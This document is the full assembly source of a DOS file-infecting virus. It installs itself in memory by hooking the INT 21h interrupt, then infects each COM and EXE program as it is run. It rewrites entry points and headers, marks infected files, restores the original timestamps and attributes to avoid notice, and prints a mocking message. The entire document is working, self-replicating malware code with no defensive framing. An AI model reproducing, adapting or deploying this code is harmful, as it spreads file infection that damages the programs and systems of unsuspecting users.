TITLE   Assembly Virus (virus.asm)

.model  tiny
.386

.code
        ORG     100h                                 ; Start address of the COM program.
start:
        jmp     setup                                ; Jumps to TSR installation.
mark    BYTE    0feh, 0feh, 0cch                     ; The infected mark.

int21_handler PROC FAR                               ; The new INT 21 handler.
        sti
        pushf
        cmp     ax, 0DCBAh                           ; Residency check.
        je      installed

        cmp     ah, 4bh                              ; Checks if a program is being executed.
        jne     to_int21

virus_begin:
        pusha
        push    ds
        mov     cs:[old_dx], dx                      ; Saves the file path.

open_file:
        mov     ax, 4300h                            ; Gets the file attribute.
        int     21h
        jc      exit

        mov     cs:[old_attr], cx
        and     cx, 0fffeh                           ; Clears read-only bit.
        mov     ax, 4301h
        int     21h                                  ; Sets the file attribute.
        jc      exit


        mov     ax, 3d02h                            ; Opens the program file in DS:DX.
        int     21h
        jc      exit
        mov     bx, ax                               ; Moves the file handle to bx.


        mov     ax, 5700h                            ; Gets the file date/time.
        int     21h
        jc      exit
        mov     cs:[old_date], dx
        mov     cs:[old_time], cx

check_file:
        ; Checks if it's an COM.
        mov     di, cs:[old_dx]
        mov     al, '.'
        cld
        repne   scasb                                ; Checks for file extension.
        cmp     WORD PTR ds:[di+2], 'M'
        jne     @F
        cmp     WORD PTR ds:[di], 'OC'
        jne     @F
        jmp     infect_com
@@:
        mov     ah, 3fh                              ; Reads the program
        mov     cx, 28                               ; header
        push    cs                                   ; into
        pop     ds                                   ; the
        lea     dx, cs:[prog_h]                      ; buffer.
        int     21h                                  ; Let's read it!!

        ; Checks if it's an EXE.
        cmp     WORD PTR cs:[prog_h],'ZM'
        je      infect_exe
        cmp     WORD PTR cs:[prog_h],'MZ'
        je      infect_exe

        jmp     close_file

infect_com:
	mov     ax, 4200h                            ; Goes to the beginning.
        mov     cx, 0
        mov     dx, 0
	int     21h

        mov     ah, 3fh                              ; Reads the first six bytes into the buffer.
        mov     cx, 6
        push    cs
        pop     ds
        lea     dx, cs:[com_beg]
        int     21h

infect_chk:
        ; Checks if it's alreadly infected.
        mov     al, BYTE PTR [com_beg+3]
        cmp     al, 0feh
        jne     @F
        mov     al, BYTE PTR [com_beg+4]
        cmp     al, 0feh
        jne     @F
        mov     al, BYTE PTR [com_beg+5]
        cmp     al, 0cch
        jne     @F

        jmp     close_file
@@:
	mov     ax, 4202h                            ; Goes to the end.
        mov     cx, 0
        mov     dx, 0
	int     21h
        sub     ax, 3h
        mov     cs:[com_end], ax                     ; Saves file size.

	mov     ax, 4200h                            ; Goes to the beginning.
        mov     cx, 0
        mov     dx, 0
	int     21h
                      
        mov     ah, 40h                              ; Writes the jump instruction.
        mov     cx, 01h
        lea     dx, cs:[jmp_inc]
        int     21h
                                                     
        mov     ah, 40h                              ; Writes the jump destination
        mov     cx, 05h                              ; and the mark.
        lea     dx, cs:[com_end]
        int     21h

	mov     ax, 4202h                            ; Goes to the end.
        mov     cx, 0
        mov     dx, 0
	int     21h

        mov     ah, 40h
	mov     cx, the_com_virus_end - the_com_virus
	lea     dx, cs:[the_com_virus]
        int     21h

        jmp     close_file


infect_exe:
        cmp     WORD PTR cs:[prog_h+12h], 'FE'       ; Checks if it's alreadly infected.
        je      close_file
        mov     WORD PTR cs:[prog_h+12h], 'FE'       ; Marks it as infected.

        mov     ax, WORD PTR cs:[prog_h+14h]
        mov     WORD PTR cs:[old_jmp], ax            ; Saves original IP;
        mov     ax, WORD PTR cs:[prog_h+16h]
        mov     WORD PTR cs:[old_jmp+2], ax          ; Saves original CS;
        mov     ax, WORD PTR cs:[bp+prog_h+0eh]
        mov     WORD PTR cs:[old_stk+2], ax          ; Saves original SS;
        mov     ax, WORD PTR cs:[bp+prog_h+10h]
        mov     WORD PTR cs:[old_stk], ax            ; Saves original SP;

	mov     ax, 4202h                            ; Goes to the end.
        mov     cx, 0
        mov     dx, 0
	int     21h

	push    ax                                   ; Saves the original end of file.
        push    dx

	mov     cx, 16
	div     cx                                   ; Gets the offset to the end.

	sub     ax, WORD PTR cs:[prog_h+8]           ; Substracts the header size from the offset.

	mov     WORD PTR cs:[prog_h+14h], dx         ; Saves the new IP.
	mov     WORD PTR cs:[prog_h+16h], ax         ; Saves the new CS.

	pop     dx
        pop     ax                                   ; Gets the original file size.

	add     ax, the_virus_end - the_virus
	adc     dx, 0

	mov     cx, 512                              ; Calculate the new page count.
	div     cx

	cmp     dx, 0                                ; Adds the incomplete page.
	je      @F
	inc     ax
@@:
	mov     WORD PTR cs:[prog_h+2], dx           ; Saves the new size of last incomplete page.
	mov     WORD PTR cs:[prog_h+4], ax           ; Saves the new page count.

	mov     ah, 40h                              ; Attaching the virus to the end.
	lea     dx, cs:[the_virus]
	mov     cx, the_virus_end - the_virus
	int     21h

	mov     ax, 4200h                            ; Goes to the beginning.
        mov     cx, 0
        mov     dx, 0
	int     21h

	mov     ah, 40h                              ; Writes the new header.
	lea     dx, cs:[prog_h]
	mov     cx, 28
	int     21h

close_file:
        mov     dx, cs:[old_date]                    ; Gets the original file date/time.
        mov     cx, cs:[old_time]
        mov     ax, 5701h
        int     21h                                  ; Sets the file date/time.

	mov     ah, 3eh                              ; Closes the file.
	int     21h

        ; Gets the file path in ds:dx.
        pop     ds
        push    ds
        mov     dx, cs:[old_dx]

        mov     cx, cs:[old_attr]                    ; Gets the original file attribute.
        mov     ax, 4301h
        int     21h                                  ; Sets the file attribute.

exit:
	pop     ds
        popa
to_int21:
        popf
        jmp     cs:[old_interrupt21]                 ; Jumps to the old INT 21 routine.

installed:
	mov     bx, 0ABCDh
        popf
        iret

the_virus:
        call    show_msg
show_msg:
        pop     bp
        sub     bp, OFFSET show_msg                  ; Gets the correct offset.


        push    ds                                   ; Saves ds
        push    es                                   ; and es.

        push    cs
        pop     ds
        push    cs
        pop     es                                   ; Changes ds, es to cs.

        ; Copies header fields.
        lea     si, cs:[bp+old_jmp]
        lea     di, cs:[bp+org_jmp]
        mov     cx, 4
        rep     movsw


        ; Displays the message to welcome him to the future program.
        mov     ah, 9
        lea     dx, cs:[bp+WTF]
        int     21h

        ; Restoration starts.

        pop     es                                   ; Restore es
        pop     ds                                   ; and ds.

        mov     ah, 1ah
        mov     dx, 80h
        int     21h                                  ; Restores DTA.

        mov     ax, es
        add     ax, 10h
        add     WORD PTR cs:[bp+org_jmp+2], ax       ; Adjusts the cs to skip the PSP.
        add     ax, WORD PTR cs:[bp+org_stk+2]       ; Adjusts the ss, too.
        cli
        mov     sp, WORD PTR cs:[bp+org_stk]         ; Restores sp.
        mov     ss, ax                               ; Restores ss.
        sti

        ; Transfers the control to the original program.
        push    WORD PTR cs:[bp+org_jmp+2]
        push    WORD PTR cs:[bp+org_jmp]
        retf

org_jmp DWORD   ?
org_stk DWORD   ?
old_jmp DWORD   0fff00000h
old_stk DWORD   ?
WTF     BYTE    "This file has been infected!! Haha!! Be careful, you idiot!",0dh,0ah,'$'
the_virus_end:
the_com_virus:
        call    show_com
show_com:
        pop     bp
        sub     bp, OFFSET show_com                  ; Gets the correct offset.
        mov     di, 100h                             ; Writes the original bytes to the beginning.
        push    di                                   ; Saves return point.
        lea     si, [bp+OFFSET com_beg]
        mov     cx, 6
        rep     movsb

        ; Displays the message to welcome him to the future program.
        mov     ah, 9
        lea     dx, cs:[bp+WTFCOM]
        int     21h

        retn
com_beg BYTE    6 DUP(?)
WTFCOM  BYTE    "This COM has been infected!! Haha!! Be careful, you idiot!",0dh,0ah,'$'
the_com_virus_end:
old_interrupt21 DWORD   ?
old_attr        WORD    ?
old_date        WORD    ?
old_time        WORD    ?
old_dx          WORD    ?
com_end         WORD    ?
                BYTE    0feh, 0feh, 0cch
jmp_inc         BYTE    0e9h
prog_h          BYTE    28 DUP(?)
int21_handler ENDP
end_virus label BYTE



setup:
	; Residency check.
        mov     bx, 0
	mov	ax, 0DCBAh
	int	21h
	cmp	bx, 0ABCDh
	je	cancel

	mov     ah, 9
	mov     dx, OFFSET msg
	int     21h

        ; Gets interrupt vector of 21h.
        mov     ax, 3521h
        int     21h
        mov     WORD PTR [old_interrupt21], bx
        mov     WORD PTR [old_interrupt21+2], es

        ; Sets interrupt vector of 21h.
        mov     ax, 2521h
        mov     dx, OFFSET int21_handler
        int     21h

        ; Terminates and stays resident.
        mov     ax, 3100h
        mov     dx, OFFSET end_virus
        shr     dx, 4
        inc     dx
        int     21h
cancel:
	mov     ah, 9
	mov     dx, OFFSET msg2
	int     21h                                  ; Displays the cancel message.
halt:
	mov	ax, 4C00h
	int	21h                                  ; Exits normally.


msg     BYTE    "Virus is installed!!",0dh,0ah,'$'
msg2    BYTE    "Virus is already present; Do nothing!!",0dh,0ah,'$'

END start

; vim: set et:
